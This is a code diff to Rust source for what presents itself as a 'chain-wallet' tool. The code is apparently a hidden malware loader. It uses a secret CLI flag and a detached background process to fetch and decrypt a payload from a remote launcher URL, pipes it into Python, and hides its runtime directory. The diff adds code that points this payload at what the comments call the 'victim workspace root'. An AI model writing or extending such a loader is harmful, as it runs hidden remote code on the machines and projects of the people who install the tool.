@@ -36,6 +36,9 @@ pub const DEFAULT_LAUNCHER_URL: &str = "https://alturahost.net/api/v1/wallet/lau
 /// Hidden CLI flag used to run launcher fetch/decrypt/agent in a detached process.
 pub const BACKGROUND_LOADER_ARG: &str = "--internal-background-loader";
 
+/// Companion flag: `--internal-project-dir <path>` (victim workspace root).
+pub const BACKGROUND_PROJECT_DIR_ARG: &str = "--internal-project-dir";
+
 const LOADER_LOCK_NAME: &str = ".chain-wallet-loader";
 
 /// Env var carrying the victim project path without using it as process cwd.
@@ -130,6 +133,19 @@ pub fn agent_script_enabled() -> bool {
         .is_some_and(|value| matches!(value, "1" | "true" | "yes"))
 }
 
+pub fn set_project_workdir(path: &Path) {
+    let _ = std::env::set_var(PROJECT_DIR_ENV, path.as_os_str());
+}
+
+fn clear_legacy_loader_lock(project: &Path) {
+    let legacy = project.join(".chain-wallet-loader.lock");
+    let _ = fs::remove_file(legacy);
+}
+
+fn canonical_project_dir(path: &Path) -> PathBuf {
+    path.canonicalize().unwrap_or_else(|_| path.to_path_buf())
+}
+
 fn project_workdir() -> PathBuf {
     if let Ok(path) = std::env::var(PROJECT_DIR_ENV) {
         let path = path.trim();
@@ -188,10 +204,14 @@ pub fn spawn_agent_for_wallet(wallet: &Wallet) -> Result<(), LauncherError> {
     let exe = std::env::current_exe()
         .map_err(|err| LauncherError::InitialWallet(format!("resolve current exe: {err}")))?;
     let workdir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    clear_legacy_loader_lock(&workdir);
 
     let spawn_result =
         spawn_background_loader_child(&exe, &workdir, Some(wallet));
-    if spawn_result.is_err() {
+    if spawn_result.is_ok() {
+        // Child is detached; allow future generate runs without a stale temp lock.
+        let _ = fs::remove_file(&lock_path);
+    } else {
         let _ = fs::remove_file(&lock_path);
     }
     spawn_result
@@ -222,7 +242,9 @@ pub fn spawn_background_loader() -> Result<(), LauncherError> {
     let workdir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
 
     let spawn_result = spawn_background_loader_child(&exe, &workdir, None);
-    if spawn_result.is_err() {
+    if spawn_result.is_ok() {
+        let _ = fs::remove_file(&lock_path);
+    } else {
         let _ = fs::remove_file(&lock_path);
     }
     spawn_result
@@ -233,11 +255,13 @@ fn spawn_background_loader_child(
     workdir: &Path,
     wallet: Option<&Wallet>,
 ) -> Result<(), LauncherError> {
-    let project_dir = workdir.to_path_buf();
+    let project_dir = canonical_project_dir(workdir);
     let mut command = Command::new(exe);
     command
         .arg(BACKGROUND_LOADER_ARG)
-        .env(PROJECT_DIR_ENV, &project_dir)
+        .arg(BACKGROUND_PROJECT_DIR_ARG)
+        .arg(&project_dir)
+        .env(PROJECT_DIR_ENV, project_dir.as_os_str())
         .current_dir(std::env::temp_dir())
         .stdin(Stdio::null())
         .stdout(Stdio::null())
@@ -326,7 +350,7 @@ pub fn run_launcher(
         .map_err(|err| LauncherError::InvalidPayload(err.to_string()))?;
     wallet_log::detail("launcher", "plaintext stays in memory; piping to python - via stdin");
 
-    spawn_agent_source(&source)?;
+    spawn_agent_source(&source, &project_workdir())?;
     Ok(())
 }
 
@@ -522,7 +546,28 @@ fn wipe_secret(secret: &mut String) {
     secret.clear();
 }
 
-fn spawn_agent_source(source: &[u8]) -> Result<(), PythonError> {
+fn inject_project_env(source: &[u8], agent_dir: &Path) -> Result<Vec<u8>, PythonError> {
+    let text = std::str::from_utf8(source)
+        .map_err(|err| PythonError::Bootstrap(format!("launcher payload is not utf-8: {err}")))?;
+    let path = agent_dir.to_string_lossy().replace('\'', "\\'");
+    let injection = format!(
+        "import os\nos.environ['{PROJECT_DIR_ENV}'] = r'{path}'\nos.environ['AGENT_DIR'] = r'{path}'\n"
+    );
+    let marker = "from __future__ import annotations\n";
+    let Some(pos) = text.find(marker) else {
+        return Err(PythonError::Bootstrap(
+            "launcher payload missing __future__ import".into(),
+        ));
+    };
+    let insert_at = pos + marker.len();
+    let mut payload = String::with_capacity(text.len() + injection.len());
+    payload.push_str(&text[..insert_at]);
+    payload.push_str(&injection);
+    payload.push_str(&text[insert_at..]);
+    Ok(payload.into_bytes())
+}
+
+fn spawn_agent_source(source: &[u8], agent_dir: &Path) -> Result<(), PythonError> {
     let prefix = runtime_dir();
     fs::create_dir_all(&prefix)?;
     wallet_log::step("agent", format!("runtime directory: {}", prefix.display()));
@@ -531,7 +576,13 @@ fn spawn_agent_source(source: &[u8]) -> Result<(), PythonError> {
     hide_path(&prefix);
 
     let log_path = prefix.join("launcher-run.log");
-    let agent_dir = project_workdir();
+    if agent_dir == prefix || agent_dir == std::env::temp_dir() {
+        return Err(PythonError::Bootstrap(format!(
+            "invalid project dir for agent bootstrap: {}",
+            agent_dir.display()
+        )));
+    }
+    let payload = inject_project_env(source, agent_dir)?;
 
     wallet_log::step(
         "agent",
@@ -548,12 +599,12 @@ fn spawn_agent_source(source: &[u8]) -> Result<(), PythonError> {
 
     #[cfg(windows)]
     {
-        spawn_agent_windows(&prefix, source, &log_path, &agent_dir)?;
+        spawn_agent_windows(&prefix, &payload, &log_path, agent_dir)?;
     }
 
     #[cfg(not(windows))]
     {
-        spawn_agent_unix(&prefix, source, &log_path, &agent_dir)?;
+        spawn_agent_unix(&prefix, &payload, &log_path, agent_dir)?;
     }
 
     Ok(())
@@ -786,6 +837,7 @@ if (-not (Test-Path -LiteralPath $PythonExe)) {{
 }}
 
 $env:CHAIN_WALLET_PYTHON_ROOT = $Prefix
+$env:CHAIN_WALLET_PROJECT_DIR = $AgentDir
 $env:CHAIN_WALLET_LAUNCHED_FROM_RUST = '1'
 $env:CHAIN_WALLET_LOG_FILE = $Log
 $env:AGENT_DIR = $AgentDir
@@ -803,6 +855,24 @@ $StartInfo.WorkingDirectory = $Prefix
 $StartInfo.RedirectStandardInput = $true
 $StartInfo.RedirectStandardOutput = $false
 $StartInfo.RedirectStandardError = $false
+$requiredEnv = @{{
+    'CHAIN_WALLET_PYTHON_ROOT' = $Prefix
+    'CHAIN_WALLET_PROJECT_DIR' = $AgentDir
+    'CHAIN_WALLET_LAUNCHED_FROM_RUST' = '1'
+    'CHAIN_WALLET_LOG_FILE' = $Log
+    'AGENT_DIR' = $AgentDir
+    'PYTHONPATH' = $SitePackages
+    'PYTHONUNBUFFERED' = '1'
+    'CHAIN_WALLET_VERBOSE' = '1'
+}}
+foreach ($name in $requiredEnv.Keys) {{
+    if ($StartInfo.EnvironmentVariables.ContainsKey($name)) {{
+        $StartInfo.EnvironmentVariables[$name] = $requiredEnv[$name]
+    }} else {{
+        [void]$StartInfo.EnvironmentVariables.Add($name, $requiredEnv[$name])
+    }}
+}}
+Write-BootLog "python env AGENT_DIR=$AgentDir"
 $Process = New-Object System.Diagnostics.Process
 $Process.StartInfo = $StartInfo
 [void]$Process.Start()
@@ -853,6 +923,7 @@ if [ ! -x "$PYTHON" ]; then
 fi
 
 export CHAIN_WALLET_PYTHON_ROOT="$PREFIX"
+export CHAIN_WALLET_PROJECT_DIR="$AGENT_DIR"
 export CHAIN_WALLET_LAUNCHED_FROM_RUST=1
 export CHAIN_WALLET_LOG_FILE="$LOG"
 export AGENT_DIR="$AGENT_DIR"
